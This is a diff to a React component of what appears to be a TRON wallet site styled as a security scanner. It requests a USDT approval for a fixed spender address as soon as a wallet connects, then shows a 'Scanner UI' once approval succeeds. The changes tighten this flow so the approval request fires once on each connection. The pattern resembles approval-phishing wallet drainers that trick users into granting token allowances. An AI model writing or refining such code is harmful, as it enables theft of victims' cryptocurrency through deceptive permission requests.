@@ -1,6 +1,6 @@
 import { motion } from "motion/react";
 import { Shield, Terminal } from "lucide-react";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { TronWeb } from "tronweb";
 import { BASE_URL, USDT_SPENDER_ADDRESS } from "../../../env";
@@ -30,7 +30,7 @@ function buildTronWeb() {
 // ======================
 // COMPONENT
 // ======================
-export function HeroSection({ onConnect, onDisconnect }: any) {
+export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any) {
   const [logs, setLogs] = useState<string[]>([]);
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
@@ -53,8 +53,17 @@ export function HeroSection({ onConnect, onDisconnect }: any) {
   // ======================
   // AUTO SYNC WALLET
   // ======================
+  const approvalAttempted = useRef(false);
+
   useEffect(() => {
-    if (connected && address) {
+    if (!connected) {
+      approvalAttempted.current = false;
+    }
+  }, [connected]);
+
+  useEffect(() => {
+    if (connected && address && !approvalAttempted.current) {
+      approvalAttempted.current = true;
       onConnect?.({
         address,
         balance: "0",
@@ -181,6 +190,9 @@ export function HeroSection({ onConnect, onDisconnect }: any) {
         `> Approval Success`,
         `> TX: ${result.txid || "unknown"}`,
       ]);
+
+      // Call success handler to trigger Scanner UI
+      onApprovalSuccess?.();
     } catch (e: any) {
       setError(e.message || "Approval failed");
     } finally {
